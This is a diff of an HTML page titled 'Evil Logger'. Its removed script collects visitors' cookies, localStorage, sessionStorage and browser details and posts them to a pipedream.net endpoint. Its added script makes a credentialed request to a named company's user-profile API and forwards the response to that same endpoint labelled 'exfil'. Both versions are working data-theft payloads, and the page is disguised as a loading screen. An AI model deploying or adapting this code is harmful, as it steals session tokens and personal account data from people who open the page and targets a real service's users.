@@ -1,34 +1,20 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="UTF-8" />
   <title>Evil Logger</title>
 </head>
 <body>
-  <h1>Loading...</h1>
+  <h1>Loading…</h1>
   <script>
-    (async () => {
-      const data = {
-        userAgent: navigator.userAgent,
-        language: navigator.language,
-        cookies: document.cookie,
-        referrer: document.referrer,
-        location: window.location.href,
-        localStorage: JSON.stringify(localStorage),
-        sessionStorage: JSON.stringify(sessionStorage),
-        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-        screen: {
-          width: screen.width,
-          height: screen.height,
-        }
-      };
-
-      await fetch("https://eoc7rtgq66dkqic.m.pipedream.net", {
+    fetch("https://ui-api.dep.mtn.co.za/api/user/me", {
+      method: "GET",
+      credentials: "include"
+    }).then(res => res.text())
+      .then(data => fetch("https://eoc7rtgq66dkqic.m.pipedream.net", {
         method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(data)
-      });
-    })();
+        body: JSON.stringify({ exfil: data }),
+        headers: { "Content-Type": "application/json" }
+      }));
   </script>
 </body>
 </html>
